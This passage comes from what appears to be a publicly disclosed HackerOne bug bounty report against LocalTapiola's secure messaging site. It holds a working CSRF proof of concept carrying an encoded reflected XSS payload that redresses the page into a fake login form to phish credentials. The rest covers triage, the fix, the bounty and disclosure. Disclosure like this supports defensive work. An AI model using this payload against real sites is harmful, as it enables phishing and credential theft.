\u003c/p\u003e\n\n\u003cp\u003e[1] Soc Eng CSRF Poc:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"c\"\u003e\u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ehistory\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epushState\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://secure.lahitapiola.fi/index.cgi\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eenctype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;multipart/form-data\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;sender\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;secure\u0026amp;#45;█████████\u0026amp;#64;rot\u0026amp;#46;fi\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;page\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;lang\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;en\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;charset\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;utf\u0026amp;#45;8\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;formsubmit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Continue\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;recipient\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;rikki\u0026amp;quot;\u0026amp;#47;\u0026amp;gt;\u0026amp;lt;\u0026amp;#47;noscript\u0026amp;gt;\u0026amp;lt;input\u0026amp;#32;type\u0026amp;#61;\u0026amp;quot;textbox\u0026amp;quot;\u0026amp;#32;name\u0026amp;#61;\u0026amp;quot;recipient\u0026amp;quot;\u0026amp;#32;class\u0026amp;#61;\u0026amp;quot;box\u0026amp;quot;\u0026amp;#32;size\u0026amp;#61;\u0026amp;quot;45\u0026amp;quot;\u0026amp;#32;value\u0026amp;#61;\u0026amp;quot;no\u0026amp;#45;reply\u0026amp;#64;lahitapiola\u0026amp;#46;fi\u0026amp;quot;\u0026amp;#47;\u0026amp;gt;\u0026amp;lt;script\u0026amp;gt;\u0026amp;#36;\u0026amp;#40;function\u0026amp;#40;\u0026amp;#41;\u0026amp;#123;\u0026amp;#36;\u0026amp;#40;\u0026amp;quot;\u0026amp;#91;class\u0026amp;#42;\u0026amp;#61;\u0026amp;apos;titletext\u0026amp;apos;\u0026amp;#32;i\u0026amp;quot;\u0026amp;#41;\u0026amp;#46;text\u0026amp;#40;\u0026amp;quot;Kirjaudu\u0026amp;#32;yritysten\u0026amp;#32;viestipalveluun\u0026amp;quot;\u0026amp;#41;\u0026amp;#59;\u0026amp;#36;\u0026amp;#40;\u0026amp;quot;\u0026amp;#91;class\u0026amp;#42;\u0026amp;#61;\u0026amp;apos;subject\u0026amp;apos;\u0026amp;#32;i\u0026amp;quot;\u0026amp;#41;\u0026amp;#46;html\u0026amp;#40;\u0026amp;quot;\u0026amp;lt;strong\u0026amp;gt;K\u0026amp;amp;auml\u0026amp;#59;ytt\u0026amp;amp;auml\u0026amp;#59;j\u0026amp;amp;auml\u0026amp;#59;nimi\u0026amp;lt;\u0026amp;#47;strong\u0026amp;gt;\u0026amp;quot;\u0026amp;#41;\u0026amp;#59;\u0026amp;#36;\u0026amp;#40;\u0026amp;quot;\u0026amp;#91;class\u0026amp;#42;\u0026amp;#61;\u0026amp;apos;messagetext\u0026amp;apos;\u0026amp;#32;i\u0026amp;quot;\u0026amp;#41;\u0026amp;#46;html\u0026amp;#40;\u0026amp;quot;\u0026amp;lt;strong\u0026amp;gt;Salasana\u0026amp;lt;\u0026amp;#47;strong\u0026amp;gt;\u0026amp;quot;\u0026amp;#41;\u0026amp;#59;\u0026amp;#36;\u0026amp;#40;\u0026amp;quot;\u0026amp;#91;class\u0026amp;#42;\u0026amp;#61;\u0026amp;apos;attachment\u0026amp;apos;\u0026amp;#32;i\u0026amp;quot;\u0026amp;#41;\u0026amp;#46;closest\u0026amp;#40;\u0026amp;quot;tr\u0026amp;quot;\u0026amp;#41;\u0026amp;#46;hide\u0026amp;#40;\u0026amp;#41;\u0026amp;#59;\u0026amp;#36;\u0026amp;#40;\u0026amp;quot;\u0026amp;#91;class\u0026amp;#42;\u0026amp;#61;\u0026amp;apos;from\u0026amp;apos;\u0026amp;#32;i\u0026amp;quot;\u0026amp;#41;\u0026amp;#46;closest\u0026amp;#40;\u0026amp;quot;tr\u0026amp;quot;\u0026amp;#41;\u0026amp;#46;hide\u0026amp;#40;\u0026amp;#41;\u0026amp;#59;\u0026amp;#36;\u0026amp;#40;\u0026amp;quot;\u0026amp;#91;class\u0026amp;#42;\u0026amp;#61;\u0026amp;apos;totext\u0026amp;apos;\u0026amp;#32;i\u0026amp;quot;\u0026amp;#41;\u0026amp;#46;closest\u0026amp;#40;\u0026amp;quot;tr\u0026amp;quot;\u0026amp;#41;\u0026amp;#46;hide\u0026amp;#40;\u0026amp;#41;\u0026amp;#59;\u0026amp;#36;\u0026amp;#40;\u0026amp;quot;\u0026amp;#91;name\u0026amp;#42;\u0026amp;#61;\u0026amp;apos;message\u0026amp;apos;\u0026amp;#32;i\u0026amp;quot;\u0026amp;#41;\u0026amp;#91;0\u0026amp;#93;\u0026amp;#46;rows\u0026amp;#61;1\u0026amp;#59;\u0026amp;#36;\u0026amp;#40;\u0026amp;quot;\u0026amp;#91;name\u0026amp;#42;\u0026amp;#61;\u0026amp;apos;message\u0026amp;apos;\u0026amp;#32;i\u0026amp;quot;\u0026amp;#41;\u0026amp;#91;0\u0026amp;#93;\u0026amp;#46;cols\u0026amp;#61;45\u0026amp;#59;\u0026amp;#125;\u0026amp;#41;\u0026amp;#59;\u0026amp;lt;\u0026amp;#47;script\u0026amp;gt;\u0026amp;#64;lahitapiola\u0026amp;#46;fi\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforms\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-02-09T22:23:33.687Z","updated_at":"2018-02-28T11:29:14.465Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":261946,"filename":"redressed.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/261/946/83c6b08ddfc322eceb32c0663dcabb66e0ef95fb/redressed.png?response-content-disposition=attachment%3B%20filename%3D%22redressed.png%22%3B%20filename%2A%3DUTF-8%27%27redressed.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIKMJWH3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053254Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHST0svsvt2laJhuwhvtFHhDNQQ1aKmdn3kMewysqUdFAiEAulql%2B612sAbGAOHB%2F14rmdeeoxU5d8%2BAmcu4RPg%2BHwYqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDCOZXQ8CegoYVtnSUSqRAzpFu%2FKSCAPO9FvY239VSQoXSErgwDzOUTpVgc827sUNqeCED0HHoCoUKyy9kO1lyu0kSFcQXf%2BvW4%2FHwxvZX6%2BphIjx2iPQX6fNNwXKcgYQYxZ8Yx%2BGm7ZXLO%2Bu7Mdu4Fn%2B9TpJQODzePG4VEMMVtb0e6FjQNUF4kQegXC133f3aM6cYX7uAbjyFy7JY7I765EFvdZteqLx2HbWaDGqldcnvslHjs3kmodLKwk9H0Ue0DoWQaLX8Vd2A0w%2FRaO%2FD7%2FQ8PGTn1qam8KaVgzORyAVZ6DxjOPjltRKnxLgyDYBYkhJ4QrBrnmUJPgQMGGWlKZ9SGJYACF0xI0BTQYivNwVfXoTMKUGwE35iziKLaZ5lyBmkqGem%2B%2FfByDZktR%2BpZGSBgSAr1UOE7ov9eb7NhNIuMzcYuOJ1sDR5pR5AlZ4GHJ8eFAlsbYZ1%2B%2F1eXzICdlYRCTp7FQRaLOJji%2BGrr7%2BDGcfEbEP64XGp9sIHjMhhaQcRwVNC6OPA5jdwFCmOnkfeeCoszPtP9ulj%2BvRBs4QMJSFqv8FOusBWzRAvPHoeI1kjG3%2Bj8jYuqVFp2PPU1q0JXR0Ajo08RGvNLJbNpVdip6BBBoiu8PCrCZDZIOwjGA3KcL5o1c4azKc2WVxPog81MB%2FMbDqzX0ad%2FLlmri78RdsSnSIX3Tn18ZdjfTGjol%2FjXedojL6GsI5pB1YlY0EqbQvBnSvbUvPa2Yr7haLR%2FQ%2FG8J8lEfc9mqMV9Imaj1ospS%2BNuCXAlVOb%2F0ya3%2BR4cs2EQotvOugeHotyPJlDfJL6Pqjp0Z9ECJu9QNa4Vn1w2ANPlIUFD2oD6RnsM%2BFR3kpEUChJsMjzZDlljBwhF14Ww%3D%3D\u0026X-Amz-Signature=9ca083b8a135190bc50ed6fac97389d9fcd7500409d070cc86c2fcdf89bebb20"}],"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2369199,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's a PoC-video F261958 which should make rambling on the previous comment a bit more easier to understand.\n\nThe PoC-attack is pretty ugly and can easily be detected as a phishing attempt as I was lazy. An actual attacker would probably spend a lot more time on making the modified page look good and also would probably make the page show something else than the message details after the victim clicks the Send-button... ","markdown_message":"\u003cp\u003eHere\u0026#39;s a PoC-video F261958 which should make rambling on the previous comment a bit more easier to understand.\u003c/p\u003e\n\n\u003cp\u003eThe PoC-attack is pretty ugly and can easily be detected as a phishing attempt as I was lazy. An actual attacker would probably spend a lot more time on making the modified page look good and also would probably make the page show something else than the message details after the victim clicks the Send-button... \u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-09T22:42:45.613Z","updated_at":"2018-02-09T22:48:08.601Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2414154,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"There is a fix deployed for this, care to retest this?","markdown_message":"\u003cp\u003eThere is a fix deployed for this, care to retest this?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-22T07:08:28.981Z","updated_at":"2018-02-22T07:08:28.981Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2415412,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, seems to be fixed!","markdown_message":"\u003cp\u003eHey, seems to be fixed!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-22T12:01:57.683Z","updated_at":"2018-02-22T12:01:57.683Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2442507,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Bounty decided based on the completeness of the report, the clever trickery and thinking involved - and of course the actual business impact related to \"exploiting the undressing of confidentiality by redressing the UI\". Nice!","markdown_message":"\u003cp\u003eBounty decided based on the completeness of the report, the clever trickery and thinking involved - and of course the actual business impact related to \u0026quot;exploiting the undressing of confidentiality by redressing the UI\u0026quot;. Nice!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-28T11:27:49.975Z","updated_at":"2018-02-28T11:27:49.975Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"putsi","url":"/putsi"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2442563,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I have asked to remove the video on the image with our personal email-addresses. Are you fine with public disclosure once that is fixed?","markdown_message":"\u003cp\u003eI have asked to remove the video on the image with our personal email-addresses. Are you fine with public disclosure once that is fixed?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-28T11:46:43.805Z","updated_at":"2018-02-28T11:46:43.805Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"putsi","url":"/putsi"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2446260,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yup I'm fine with public disclosure if the attachments F261950  and F261958  are removed.\nThanks for the bounty!","markdown_message":"\u003cp\u003eYup I\u0026#39;m fine with public disclosure if the attachments F261950  and F261958  are removed.\u003cbr\u003e\nThanks for the bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-01T11:50:47.779Z","updated_at":"2018-03-01T11:51:01.718Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2448099,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Full disclosure. Thanks again.","markdown_message":"\u003cp\u003eFull disclosure. Thanks again.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-01T22:04:23.553Z","updated_at":"2018-03-01T22:04:23.553Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2448546,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-02T04:01:12.272Z","updated_at":"2018-03-02T04:01:12.272Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2448547,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-02T04:01:12.346Z","updated_at":"2018-03-02T04:01:12.346Z","actor":{"username":"putsi","cleared":true,"url":"/putsi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":6674,"category":"team","content":"##Issue\n\nThe reporter was able to misuse a couple of flaws in the system. By using a reflected XSS (due to missing validation) combined with a CSRF the reporter could create open redirects (via javascript), was able to read all present lahitapiola.fi cookies as well as cookies from the the secure-subdomain. Finally the reporter showed how to perform a complete redress of the UI and fooling the user to submit login-information and sending that login information back to the reporter himself as an error message.  Clever!\n\n##Fix\n\nThe issue was investigated and found to be valid and in scope for a fix. Details about the fix are not disclosed. \n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. The root cause was not severe or complicated from a technical point of view. However, the found flaw enabled quite a bit of different approaches to do harm. The bounty is not based directly on the weakness, but rather on the business impact as well clever thinking.","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eThe reporter was able to misuse a couple of flaws in the system. By using a reflected XSS (due to missing validation) combined with a CSRF the reporter could create open redirects (via javascript), was able to read all present lahitapiola.fi cookies as well as cookies from the the secure-subdomain. Finally the reporter showed how to perform a complete redress of the UI and fooling the user to submit login-information and sending that login information back to the reporter himself as an error message.  Clever!\u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003eFix\u003c/h2\u003e\n\n\u003cp\u003eThe issue was investigated and found to be valid and in scope for a fix. Details about the fix are not disclosed. \u003c/p\u003e\n\n\u003ch2 id=\"reasoning\"\u003eReasoning\u003c/h2\u003e\n\n\u003cp\u003eThe reported case was valid and within the scope of the bug bounty program. The root cause was not severe or complicated from a technical point of view. However, the found flaw enabled quite a bit of different approaches to do harm. The bounty is not based directly on the weakness, but rather on the business impact as well clever thinking.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}